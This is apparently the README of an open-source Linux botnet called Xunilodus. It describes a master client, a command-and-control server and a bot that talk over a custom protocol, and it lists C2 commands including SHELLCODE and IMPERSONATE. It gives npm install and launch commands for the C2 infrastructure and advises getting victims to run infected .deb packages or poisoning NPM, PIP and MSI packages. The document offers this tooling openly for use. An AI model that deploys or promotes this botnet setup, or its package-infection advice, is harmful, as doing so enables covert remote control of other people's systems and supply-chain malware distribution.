<h1 align="center">Xunilodus Botnet</h1>

<p align="center">
  <img src="https://badgen.net/badge/dist/NPM/blue?icon=label"/>
  <img src="https://badgen.net/npm/dt/xunilodus-server"/>
  <img src="https://badgen.net/badge/lang/Javascript/orange?icon=label"/>
  <img src="https://badgen.net/badge/lang/Python/yellow?icon=label"/>
  <img src="https://badgen.net/badge/license/MIT/blue?icon=label"/>
  <img src="https://badgen.net/badge/author/MurylloEx/red?icon=label"/>
</p>

<p align="center">
  <img src="https://i.imgur.com/T4JxPmw.png" style="min-width:256px;max-width:384px;"/>
</p> 

The open-source project of a botnet master, command control and bot with linux system's as target.

Known targets:
- Debian;
- Ubuntu;
- Linux Mint/Cinnamon;
- PopOS;
- And some others!

## 1. How it works?

Xunilodus is a botnet designed on the Python, Node.js and Shell Script language to work on systems with kernel derived from linux.

Its form of communication is based on a protocol superior to the WebSocket called SFXTP (Single Frame Xunilodus Transmission Protocol). This protocol allows communications between the Master, the Command Center and the Bot. For reasons of limitation, each frame (data packet) is restricted to 65535 bytes (~64kb).

Each command sent by the master to the bot is tunneled by the command center that directs which bot to send the information through an open socket.

All traffic data between a Master and a Bot is tunneled by Command Control.

<p align="center">
  <img alt="Botnet Scheme" src="https://i.imgur.com/6gCJrAI.png">
</p>

## 2. SFXTP (Single Frame Xunilodus Transmission Protocol)

<p align="center">
  <img alt="SFXTP" src="https://i.imgur.com/UYBhhpe.png">
</p>

## 3. Command Control - List of supported commands

- HELP
- IMPERSONATE
- DEPERSONATE
- LISTBOTS
- SHELLCODE

## 4. Installation

<p align="center">
  <img alt="Installation Image" src="https://nodei.co/npm/xunilodus-server.png?downloads=true&downloadRank=true&stars=true">
  <img alt="Installation Image" src="https://nodei.co/npm/xunilodus-master.png?downloads=true&downloadRank=true&stars=true">
</p>

```
npm install -g xunilodus-server
npm install -g xunilodus-master
```

You need first install the **Xunilodus Master Client CLI** and the **Xunilodus Server Command Control**. Run the commands above to do that.

### 4.1 Techniques to exploit the target

Also, to gain control over your target, you must exploit some vulnerability of the target linux system and then make it run your exploit in python. Remember to change the address of your own command and control server.

It is out of the question to explain how to accomplish this in this project, but what you can do is create an infected .deb package and persuade your victim to run it. There are also other techniques such as infecting NPM, PIP, DEB, MSI packages in Windows, among others.

## 5. Setting up a Xunilodus Botnet Server

You will need a WebServer with at least 1GB of RAM and open one port in your firewall (the default port for Xunilodus is 44335).

After change the rules of your firewall and install the Xunilodus Server CLI, run the command with your port: 

```
xunilodus-server --port=44335
```

## 6. Connecting to Xunilodus Server in a Master Client

Run the following command to connect to a Xunilodus server instance:

```
xunilodus-master --address=127.0.0.1 --port=44335 --ws
```

Change the address to your external ip address or local address. If you are running over a proxy like cloudflare with HTTPS or something like, provide the correct port (443 for default HTTPS) and change the protocol to --wss (Web Socket Secure).

```
xunilodus-master --address=my.domain.com --port=443 --wss
```